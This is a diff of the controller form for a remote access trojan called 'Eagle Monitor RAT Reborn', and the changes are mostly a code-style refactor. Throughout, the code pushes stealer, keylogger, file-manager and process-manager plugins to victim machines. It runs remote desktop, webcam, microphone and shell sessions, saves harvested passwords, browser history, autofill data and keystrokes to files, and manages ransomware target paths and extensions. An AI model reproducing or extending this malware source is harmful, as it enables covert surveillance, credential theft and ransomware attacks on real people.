@@ -12,7 +12,6 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Text;
-using System.Threading;
 using System.Windows.Forms;
 
 /* 
@@ -22,33 +21,33 @@ using System.Windows.Forms;
 
 namespace Eagle_Monitor_RAT_Reborn
 {
-    public partial class ClientForm : FormPattern
+    internal partial class ClientForm : FormPattern
     {
-        internal ClientHandler clientHandler { get; set; }
-        internal RemoteDesktopHandler remoteDesktopHandler { get; set; }
-        internal RemoteWebCamHandler remoteWebCamHandler { get; set; }
-        internal RemoteMicrophoneHandler remoteMicrophoneHandler { get; set; }
-        internal KeyloggerHandler keyloggerHandler { get; set; }
-        internal ChatHandler chatHandler { get; set; }
-        internal RemoteShellHandler remoteShellHandler { get; set; }
+        internal ClientHandler ClientHandler { get; set; }
+        internal RemoteDesktopHandler RemoteDesktopHandler { get; set; }
+        internal RemoteWebCamHandler RemoteWebCamHandler { get; set; }
+        internal RemoteMicrophoneHandler RemoteMicrophoneHandler { get; set; }
+        internal KeyloggerHandler KeyloggerHandler { get; set; }
+        internal ChatHandler ChatHandler { get; set; }
+        internal RemoteShellHandler RemoteShellHandler { get; set; }
 
-        internal long downloadFileTicket { get; set; }
-        internal Dictionary<long, DataGridViewRow> downloadList { get; set; }
+        internal long DownloadFileTicket { get; set; }
+        internal Dictionary<long, DataGridViewRow> DownloadList { get; set; }
 
-        internal long deleteFileTicket { get; set; }
-        internal Dictionary<long, DataGridViewRow> deleteList { get; set; }
+        internal long DeleteFileTicket { get; set; }
+        internal Dictionary<long, DataGridViewRow> DeleteList { get; set; }
 
         internal ClientForm(ClientHandler clientHandler)
         {
             InitializeComponent();
-            this.clientHandler = clientHandler;
-            this.downloadFileTicket = 0;
-            this.downloadList = new Dictionary<long, DataGridViewRow>();
+            this.ClientHandler = clientHandler;
+            this.DownloadFileTicket = 0;
+            this.DownloadList = new Dictionary<long, DataGridViewRow>();
 
-            this.deleteFileTicket = 0;
-            this.deleteList = new Dictionary<long, DataGridViewRow>();
+            this.DeleteFileTicket = 0;
+            this.DeleteList = new Dictionary<long, DataGridViewRow>();
 
-            if (this.clientHandler.isAdmin)
+            if (this.ClientHandler.IsAdmin)
                 this.askUACGuna2Button.Enabled = false;
         }
 
@@ -62,6 +61,7 @@ namespace Eagle_Monitor_RAT_Reborn
         private void SetUI()
         {
             this.SuspendLayout();
+            #region "Double buffer"
             Utils.Enable(this.passwordsDataGridView);
             Utils.Enable(this.historyDataGridView);
 
@@ -74,7 +74,17 @@ namespace Eagle_Monitor_RAT_Reborn
 
             Utils.Enable(this.importLibDataGridView);
             Utils.Enable(this.shellcodeDataGridView);
+            Utils.Enable(this.managedPEDataGridView);
+            Utils.Enable(this.nativePEDataGridView);
 
+            Utils.Enable(this.systemInformationDataGridView);
+            Utils.Enable(this.componentsDataGridView);
+            Utils.Enable(this.cpuDataGridView);
+            Utils.Enable(this.networkInformationDataGridView);
+
+            Utils.Enable(this.pathRansomwareDataGridView);
+            #endregion
+            #region "Vertical Scrollbar"
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.passwordsDataGridView, this.guna2VScrollBar1, true);
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.historyDataGridView, this.guna2VScrollBar2, true);
 
@@ -96,131 +106,72 @@ namespace Eagle_Monitor_RAT_Reborn
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.pathRansomwareDataGridView, this.guna2VScrollBar13, true);
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.extensionRansomwareDataGridView, this.guna2VScrollBar14, true);
 
-            ImageList tabImageList = new ImageList
+            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.networkInformationDataGridView, this.guna2VScrollBar15, true);
+            #endregion
+            #region "TabImage"
+            Utils.SetTabImage(this.mainGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
-
-            tabImageList.Images.Add(Properties.Resources.icons8_database_backup);
-            tabImageList.Images.Add(Properties.Resources.icons8_file_explorer);
-            tabImageList.Images.Add(Properties.Resources.icons8_system_task);
-            tabImageList.Images.Add(Properties.Resources.icons8_remote_desktop);
-            tabImageList.Images.Add(Properties.Resources.icons8_control_panel);
-            tabImageList.Images.Add(Properties.Resources.icons8_microsoft_admin);
-            tabImageList.Images.Add(Properties.Resources.icons8_security_document);
-            tabImageList.Images.Add(Properties.Resources.icons8_command_line);
-
-            this.mainGuna2TabControl.ImageList = tabImageList;
-            this.tabPage1.ImageIndex = 0;
-            this.tabPage2.ImageIndex = 1;
-            this.tabPage5.ImageIndex = 2;
-            this.tabPage8.ImageIndex = 3;
-            this.tabPage14.ImageIndex = 4;
-            this.tabPage24.ImageIndex = 5;
-            this.tabPage25.ImageIndex = 6;
-            this.tabPage29.ImageIndex = 7;
-
-            ImageList recoveryTabList = new ImageList
+                Properties.Resources.icons8_database_backup,
+                Properties.Resources.icons8_file_explorer,
+                Properties.Resources.icons8_system_task,
+                Properties.Resources.icons8_remote_desktop,
+                Properties.Resources.icons8_control_panel,
+                Properties.Resources.icons8_microsoft_admin,
+                Properties.Resources.icons8_security_document,
+                Properties.Resources.icons8_computer_virus
+            });
+   
+            Utils.SetTabImage(this.recoveryGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
+                Properties.Resources.icons8_key,
+                Properties.Resources.icons8_time_machine,
+                Properties.Resources.icons8_text_input_form,
+                Properties.Resources.icons8_single_line_text_input
+            });
 
-            recoveryTabList.Images.Add(Properties.Resources.icons8_key);
-            recoveryTabList.Images.Add(Properties.Resources.icons8_time_machine);
-
-            recoveryTabList.Images.Add(Properties.Resources.icons8_text_input_form);
-            recoveryTabList.Images.Add(Properties.Resources.icons8_single_line_text_input);
-
-            this.recoveryGuna2TabControl.ImageList = recoveryTabList;
-            this.tabPage3.ImageIndex = 0;
-            this.tabPage4.ImageIndex = 1;
-            this.tabPage7.ImageIndex = 2;
-            this.tabPage6.ImageIndex = 3;
-
-            ImageList remoteTabList = new ImageList
+            Utils.SetTabImage(this.remoteGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
+                Properties.Resources.icons8_imac,
+                Properties.Resources.icons8_video_call,
+                Properties.Resources.icons8_microphone
+            });
 
-            remoteTabList.Images.Add(Properties.Resources.icons8_imac);
-            remoteTabList.Images.Add(Properties.Resources.icons8_video_call);
-            remoteTabList.Images.Add(Properties.Resources.icons8_microphone);
-
-            this.remoteGuna2TabControl.ImageList = remoteTabList;
-            this.tabPage10.ImageIndex = 0;
-            this.tabPage11.ImageIndex = 1;
-            this.tabPage12.ImageIndex = 2;
-
-            ImageList fileManager = new ImageList
+            Utils.SetTabImage(this.fileManagerGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
+                Properties.Resources.icons8_file_explorer,
+                Properties.Resources.icons8_download
+            });     
 
-            fileManager.Images.Add(Properties.Resources.icons8_file_explorer);
-            fileManager.Images.Add(Properties.Resources.icons8_download);
-
-            this.fileManagerGuna2TabControl.ImageList = fileManager;
-            this.tabPage9.ImageIndex = 0;
-            this.tabPage13.ImageIndex = 1;
-
-            ImageList miscellaneousTabList = new ImageList
+            Utils.SetTabImage(this.miscellaneousGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
+                Properties.Resources.icons8_computer_virus,
+                Properties.Resources.icons8_keyboard,
+                Properties.Resources.icons8_information,
+                Properties.Resources.icons8_question_mark,
+                Properties.Resources.icons8_chat
+            });
 
-            miscellaneousTabList.Images.Add(Properties.Resources.icons8_computer_virus);
-            miscellaneousTabList.Images.Add(Properties.Resources.icons8_keyboard);
-            miscellaneousTabList.Images.Add(Properties.Resources.icons8_information);
-            miscellaneousTabList.Images.Add(Properties.Resources.icons8_question_mark);
-            miscellaneousTabList.Images.Add(Properties.Resources.icons8_chat);
-
-            this.miscellaneousGuna2TabControl.ImageList = miscellaneousTabList;
-
-            this.tabPage15.ImageIndex = 0;
-            this.tabPage16.ImageIndex = 1;
-            this.tabPage17.ImageIndex = 2;
-            this.tabPage18.ImageIndex = 3;
-            this.tabPage23.ImageIndex = 4;
-
-            ImageList memoryExecutionTabList = new ImageList
+            Utils.SetTabImage(this.memoryExecutionGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
+                Properties.Resources.icons8_c_plus_plus,
+                Properties.Resources.icons8_Binary_Code,
+                Properties.Resources.icons8_source_code,
+                Properties.Resources.icons8_visual_basic
+            });
 
-            memoryExecutionTabList.Images.Add(Properties.Resources.icons8_c_plus_plus);
-            memoryExecutionTabList.Images.Add(Properties.Resources.Binary_Code_32px);
-            memoryExecutionTabList.Images.Add(Properties.Resources.icons8_source_code);
-            memoryExecutionTabList.Images.Add(Properties.Resources.icons8_visual_basic);
-
-            this.memoryExecutionGuna2TabControl.ImageList = memoryExecutionTabList;
-
-            this.tabPage19.ImageIndex = 0;
-            this.tabPage20.ImageIndex = 1;
-            this.tabPage21.ImageIndex = 2;
-            this.tabPage22.ImageIndex = 3;
-
-            ImageList ransomwareTabList = new ImageList
+            Utils.SetTabImage(this.ransomwareGuna2TabControl, new Icon[]
             {
-                ColorDepth = ColorDepth.Depth32Bit,
-                ImageSize = new Size(28, 28)
-            };
+                Properties.Resources.icons8_private_folder,
+                Properties.Resources.icons8_settings,
+                Properties.Resources.icons8_lock_file
+            });
 
-            ransomwareTabList.Images.Add(Properties.Resources.icons8_private_folder);
-            ransomwareTabList.Images.Add(Properties.Resources.icons8_settings);
-            ransomwareTabList.Images.Add(Properties.Resources.icons8_lock_file);
-
-            this.ransomwareGuna2TabControl.ImageList = ransomwareTabList;
-
-            this.tabPage26.ImageIndex = 0;
-            this.tabPage27.ImageIndex = 1;
-            this.tabPage28.ImageIndex = 2;
-
+            Utils.SetTabImage(this.informationGuna2TabControl, new Icon[] 
+            {
+                Properties.Resources.icons8_electronics,
+                Properties.Resources.icons8_ethernet_on
+            });
+            #endregion
 
             Misc.DotNetCodeExecution.RowAdder("System.dll", this.importLibDataGridView);
             Misc.DotNetCodeExecution.RowAdder("Microsoft.VisualBasic.dll", this.importLibDataGridView);
@@ -228,7 +179,7 @@ namespace Eagle_Monitor_RAT_Reborn
             Misc.DotNetCodeExecution.RowAdder("System.Management.dll", this.importLibDataGridView);
             Misc.DotNetCodeExecution.RowAdder("System.Drawing.dll", this.importLibDataGridView);
 
-            string extensionsPath = this.clientHandler.clientPath + "\\Ransomware\\extensions.txt";
+            string extensionsPath = this.ClientHandler.ClientPath + "\\Ransomware\\extensions.txt";
 
             if (!File.Exists(extensionsPath))
             {
@@ -245,7 +196,7 @@ namespace Eagle_Monitor_RAT_Reborn
                 row.Cells["Column47"].Value = extension;
             }
 
-            string pathAffectecd = this.clientHandler.clientPath + "\\Ransomware\\paths.txt";
+            string pathAffectecd = this.ClientHandler.ClientPath + "\\Ransomware\\paths.txt";
 
             if (File.Exists(pathAffectecd))
             {
@@ -271,7 +222,7 @@ namespace Eagle_Monitor_RAT_Reborn
             {
                 pathAffected.AppendLine(row.Cells[0].Value.ToString());
             }
-            File.WriteAllText(this.clientHandler.clientPath + "\\Ransomware\\paths.txt", pathAffected.ToString());
+            File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\paths.txt", pathAffected.ToString());
 
             StringBuilder extensions = new StringBuilder();
 
@@ -279,18 +230,18 @@ namespace Eagle_Monitor_RAT_Reborn
             {
                 extensions.AppendLine(row.Cells[0].Value.ToString());          
             }
-            File.WriteAllText(this.clientHandler.clientPath + "\\Ransomware\\extensions.txt", extensions.ToString());
+            File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\extensions.txt", extensions.ToString());
 
             if ((passwordsDataGridView.Rows.Count > 0 || historyDataGridView.Rows.Count > 0 || keywordsDataGridView.Rows.Count > 0 || autofillDataGridView.Rows.Count > 0) && !Program.settings.autoSaveRecovery)
             {
                 DialogResult r = MessageBox.Show("It seems that some data have not been saved. Do you want to save them before closing ?", "Data not saved", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Information);
                 if (r == DialogResult.Yes)
                 {
-                    Misc.Utils.ToCSV(this.passwordsDataGridView, this.clientHandler.clientPath + "\\Passwords\\" + Misc.Utils.DateFormater() + ".csv");
-                    Misc.Utils.ToCSV(this.historyDataGridView, this.clientHandler.clientPath + "\\History\\" + Misc.Utils.DateFormater() + ".csv");
+                    Misc.Utils.ToCSV(this.passwordsDataGridView, this.ClientHandler.ClientPath + "\\Passwords\\" + Misc.Utils.DateFormater() + ".csv");
+                    Misc.Utils.ToCSV(this.historyDataGridView, this.ClientHandler.ClientPath + "\\History\\" + Misc.Utils.DateFormater() + ".csv");
 
-                    Misc.Utils.ToCSV(this.clientHandler.clientForm.keywordsDataGridView, this.clientHandler.clientPath + "\\Keywords\\" + Misc.Utils.DateFormater() + ".csv");
-                    Misc.Utils.ToCSV(this.clientHandler.clientForm.autofillDataGridView, this.clientHandler.clientPath + "\\Autofill\\" + Misc.Utils.DateFormater() + ".csv");
+                    Misc.Utils.ToCSV(this.ClientHandler.ClientForm.keywordsDataGridView, this.ClientHandler.ClientPath + "\\Keywords\\" + Misc.Utils.DateFormater() + ".csv");
+                    Misc.Utils.ToCSV(this.ClientHandler.ClientForm.autofillDataGridView, this.ClientHandler.ClientPath + "\\Autofill\\" + Misc.Utils.DateFormater() + ".csv");
 
                     this.Close();
                 }
@@ -308,67 +259,71 @@ namespace Eagle_Monitor_RAT_Reborn
 
         private void FixClientHandlersBeforeLeaving()
         {
-            if (this.remoteDesktopHandler != null)
+            if (this.RemoteDesktopHandler != null)
             {
                 mouseGuna2ToggleSwitch.Checked = false;
                 keyboardGuna2ToggleSwitch.Checked = false;
 
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                 {
-                    baseIp = this.clientHandler.IP,
-                    HWID = this.clientHandler.HWID
+                    BaseIp = this.ClientHandler.IP,
+                    HWID = this.ClientHandler.HWID
                 };
-                this.remoteDesktopHandler.clientHandler.SendPacket(remoteViewerPacket);
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
+              //  this.remoteDesktopHandler.clientHandler.StartSendData(remoteViewerPacket);
             }
 
-            if (this.remoteWebCamHandler != null)
+            if (this.RemoteWebCamHandler != null)
             {
                 RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
                 {
-                    baseIp = this.clientHandler.IP,
-                    HWID = this.clientHandler.HWID
+                    BaseIp = this.ClientHandler.IP,
+                    HWID = this.ClientHandler.HWID
                 };
-                this.remoteWebCamHandler.clientHandler.SendPacket(remoteCameraCapturePacket);
+                ClientHandler.StartSendData(this.RemoteWebCamHandler.ClientHandler, remoteCameraCapturePacket);
+                //this.remoteWebCamHandler.clientHandler.StartSendData(remoteCameraCapturePacket);
             }
 
-            if (this.remoteMicrophoneHandler != null)
+            if (this.RemoteMicrophoneHandler != null)
             {
                 RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
                 {
-                    baseIp = this.clientHandler.IP,
-                    HWID = this.clientHandler.HWID
+                    BaseIp = this.ClientHandler.IP,
+                    HWID = this.ClientHandler.HWID
                 };
-                this.remoteMicrophoneHandler.clientHandler.SendPacket(remoteAudioCapturePacket);
+                ClientHandler.StartSendData(this.RemoteMicrophoneHandler.ClientHandler, remoteAudioCapturePacket);
             }
 
-            if (this.keyloggerHandler != null)
+            if (this.KeyloggerHandler != null)
             {
-                KeylogPacket keylogPacket = new KeylogPacket(this.clientHandler.IP, this.clientHandler.HWID) 
+                KeylogPacket keylogPacket = new KeylogPacket(this.ClientHandler.IP, this.ClientHandler.HWID) 
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
                 };
 
-                this.keyloggerHandler.clientHandler.SendPacket(keylogPacket);
+                ClientHandler.StartSendData(this.KeyloggerHandler.ClientHandler, keylogPacket);
                 this.keyloggerGuna2Button.Text = "Start";
-                File.WriteAllText(this.clientHandler.clientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", this.keystrokeRichTextBox.Text);
+                File.WriteAllText(this.ClientHandler.ClientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", this.keystrokeRichTextBox.Text);
             }
 
-            if (this.chatHandler != null)
+            if (this.ChatHandler != null)
             {
-                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF);
-                chatPacket.baseIp = this.clientHandler.IP;
-                this.chatHandler.clientHandler.SendPacket(chatPacket);
+                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF)
+                {
+                    BaseIp = this.ClientHandler.IP
+                };
+                ClientHandler.StartSendData(this.ChatHandler.ClientHandler, chatPacket);
                 this.chatGuna2Button.Text = "Start";
             }
   
-            if (this.remoteShellHandler != null)
+            if (this.RemoteShellHandler != null)
             {
                 StopShellSessionPacket stopShellSessionPacket = new StopShellSessionPacket()
                 {
-                    baseIp = this.clientHandler.IP,
-                    HWID = this.clientHandler.HWID
+                    BaseIp = this.ClientHandler.IP,
+                    HWID = this.ClientHandler.HWID
                 };
-                this.remoteShellHandler.clientHandler.SendPacket(stopShellSessionPacket);
+                ClientHandler.StartSendData(this.RemoteShellHandler.ClientHandler, stopShellSessionPacket);
                 this.remoteShellGuna2Button.Text = "Start Session";
             }
         }
@@ -416,16 +371,15 @@ namespace Eagle_Monitor_RAT_Reborn
             this.processDataGridView.CurrentCell = null;
         }
         #endregion
-        #region "Recovery"
-        #region "Password"
+        #region "Recovery"  
         private void getPasswordToolStripMenuItem_Click(object sender, EventArgs e)
         {
             PasswordsPacket passwordsPacket = new PasswordsPacket
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
             };
 
-            this.clientHandler.SendPacket(passwordsPacket);
+            ClientHandler.StartSendData(this.ClientHandler, passwordsPacket);
         }
 
         private void passwordsDataGridView_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
@@ -440,16 +394,15 @@ namespace Eagle_Monitor_RAT_Reborn
                 }
             }
         }
-        #endregion
-        #region "History"
+     
         private void historyToolStripMenuItem_Click(object sender, EventArgs e)
         {
             HistoryPacket historyPacket = new HistoryPacket
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
             };
 
-            this.clientHandler.SendPacket(historyPacket);
+            ClientHandler.StartSendData(this.ClientHandler, historyPacket);
         }
 
         private void historyDataGridView_MouseUp(object sender, MouseEventArgs e)
@@ -464,16 +417,16 @@ namespace Eagle_Monitor_RAT_Reborn
                 }
             }
         }
-        #endregion
+       
 
         private void autofillToolStripMenuItem_Click(object sender, EventArgs e)
         {
             AutofillPacket autofillPacket = new AutofillPacket
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
             };
 
-            this.clientHandler.SendPacket(autofillPacket);
+            ClientHandler.StartSendData(this.ClientHandler, autofillPacket);
         }
 
         private void keywordsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -481,10 +434,10 @@ namespace Eagle_Monitor_RAT_Reborn
 
             KeywordsPacket keywordsPacket = new KeywordsPacket
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
             };
 
-            this.clientHandler.SendPacket(keywordsPacket);
+            ClientHandler.StartSendData(this.ClientHandler, keywordsPacket);
         }
 
         private void keywordsDataGridView_MouseUp(object sender, MouseEventArgs e)
@@ -517,9 +470,11 @@ namespace Eagle_Monitor_RAT_Reborn
         #region "File Manager"
         private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            DiskPacket diskPacket = new DiskPacket();
-            diskPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1);
-            this.clientHandler.SendPacket(diskPacket);
+            DiskPacket diskPacket = new DiskPacket
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, diskPacket);
         }
 
         private void disksGuna2ComboBox_SelectedIndexChanged(object sender, EventArgs e)
@@ -527,9 +482,9 @@ namespace Eagle_Monitor_RAT_Reborn
             this.labelPath.Text = disksGuna2ComboBox.Text;
             FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
             };
-            clientHandler.SendPacket(fileManagerPacket);
+            ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
         }
 
         private void goToolStripMenuItem_Click(object sender, EventArgs e)
@@ -542,9 +497,9 @@ namespace Eagle_Monitor_RAT_Reborn
                     this.labelPath.Text = newPath;
                     FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                     {
-                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                     };
-                    clientHandler.SendPacket(fileManagerPacket);
+                    ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
                 }
             }
         }
@@ -562,9 +517,9 @@ namespace Eagle_Monitor_RAT_Reborn
                 this.labelPath.Text = NewPath;
                 FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                 };
-                clientHandler.SendPacket(fileManagerPacket);
+                ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
             }
         }
 
@@ -578,9 +533,9 @@ namespace Eagle_Monitor_RAT_Reborn
                     this.labelPath.Text = newPath;
                     FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                     {
-                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                     };
-                    clientHandler.SendPacket(fileManagerPacket);
+                    ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
                 }
             }
         }
@@ -612,15 +567,15 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             foreach (DataGridViewRow file in dowloadFileDataGridView.SelectedRows)
             {
-                DownloadFilePacket dowloadFilePacket = new DownloadFilePacket(file.Cells[3].Value.ToString(), downloadFileTicket)
+                DownloadFilePacket dowloadFilePacket = new DownloadFilePacket(file.Cells[3].Value.ToString(), DownloadFileTicket)
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1),
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1),
                     bufferSize = Program.settings.bufferSize
                 };
 
-                downloadList.Add(downloadFileTicket, file);
-                this.clientHandler.SendPacket(dowloadFilePacket);
-                downloadFileTicket += 1;
+                DownloadList.Add(DownloadFileTicket, file);
+                ClientHandler.StartSendData(this.ClientHandler, dowloadFilePacket);
+                DownloadFileTicket += 1;
             }
         }
         private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
@@ -632,14 +587,14 @@ namespace Eagle_Monitor_RAT_Reborn
                 else
                 {
                     string fullPath = labelPath.Text + file.Cells[1].Value.ToString();
-                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(fullPath, Misc.Utils.SplitPath(fullPath), deleteFileTicket)
+                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(fullPath, Misc.Utils.SplitPath(fullPath), DeleteFileTicket)
                     {
-                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                     };
 
-                    deleteList.Add(deleteFileTicket, file);
-                    this.clientHandler.SendPacket(deleteFilePacket);
-                    deleteFileTicket += 1;
+                    DeleteList.Add(DeleteFileTicket, file);
+                    ClientHandler.StartSendData(this.ClientHandler, deleteFilePacket);
+                    DeleteFileTicket += 1;
                 }
             }
         }
@@ -648,36 +603,36 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOWNLOADS)
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
             };
-            clientHandler.SendPacket(shortCutFileManagersPacket);
+            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
         }
 
         private void desktopSToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DESKTOP)
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
             };
-            clientHandler.SendPacket(shortCutFileManagersPacket);
+            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
         }
 
         private void documentsSToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOCUMENTS)
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
             };
-            clientHandler.SendPacket(shortCutFileManagersPacket);
+            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
         }
 
         private void userProfileSToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.USER_PROFILE)
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
             };
-            clientHandler.SendPacket(shortCutFileManagersPacket);
+            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
         }
         #endregion
         #region "Directory"
@@ -728,9 +683,11 @@ namespace Eagle_Monitor_RAT_Reborn
         #region "Process Manager"
         private void refreshProcessToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            ProcessManagerPacket processManagerPacket = new ProcessManagerPacket();
-            processManagerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1);
-            clientHandler.SendPacket(processManagerPacket);
+            ProcessManagerPacket processManagerPacket = new ProcessManagerPacket
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
+            };
+            ClientHandler.StartSendData(ClientHandler, processManagerPacket);
         }
 
         private void killToolStripMenuItem_Click(object sender, EventArgs e)
@@ -738,9 +695,11 @@ namespace Eagle_Monitor_RAT_Reborn
             foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
             {
                 int procId = int.Parse(selected.Cells[1].Value.ToString());
